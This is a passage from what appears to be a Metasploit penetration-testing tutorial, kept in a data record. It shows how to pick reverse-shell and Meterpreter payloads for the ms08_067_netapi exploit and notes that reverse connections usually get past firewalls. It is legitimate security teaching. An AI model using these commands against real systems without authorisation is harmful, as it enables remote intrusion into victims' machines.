- img_proc: false
  md: "Or you can type \"**set payload**\" and hit the tab key twice. This will prompt\
    \ Metasploit to ask you if you want to see all the available payloads:\n\n```\n\
    msf exploit(ms08_067_netapi) > set payload\nDisplay all 141 possibilities? (y\
    \ or n)\n```\n\nIf you type '**y**', Metasploit would list all of the available\
    \ payloads, there are a lot of possibilities!\n\n# Payload Layout\n\nMost of the\
    \ payloads are laid out in the format of '***Operating System/Shell Type***' as\
    \ shown below:\n\n```\n    payload/osx/x86/shell_reverse_tcp\n    payload/linux/x64/shell_reverse_tcp\n\
    \    payload/windows/shell_reverse_tcp\n    payload/windows/meterpreter/reverse_tcp\n\
    ```\n\nSimply select the correct OS for your target and then pick the payload\
    \ you want. The most popular types of payloads are shells, either a regular ***remote\
    \ shell*** or a ***Meterpreter shell***. If we just want a remote terminal shell\
    \ to remotely run commands, use the standard shell. If you want the capability\
    \ to manipulate the session and run extended commands then you will want the Meterpreter\
    \ shell (which we will discuss in further detail in the next chapter).\n\nThere\
    \ are different types of ways that the payloads communicate back to the attacking\
    \ system. I usually prefer ***reverse_tcp*** shells as once they are executed\
    \ on the target system, they tell the attacking machine to connect back out to\
    \ our Kali system. The big advantage to this is that with the victim machine technically\
    \ \"initiating\" the connection out, it usually is not blocked by the Firewall.\
    \ A connection trying to come in from the outside most likely will.\n\nOnce we\
    \ know what payload we want to use, we set it using the \"**set**\" command.\n\
    \n+   6. I'll use a *Meterpreter shell* for a *Windows system* and have it connect\
    \ back to us using *reverse_tcp*, as seen below:\n\n```\nmsf exploit(ms08_067_netapi)\
    \ > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\n\
    ```\n\nNow that our payload is set, we just need to set the options for it.\n\n\
    # Setting Payload Options"
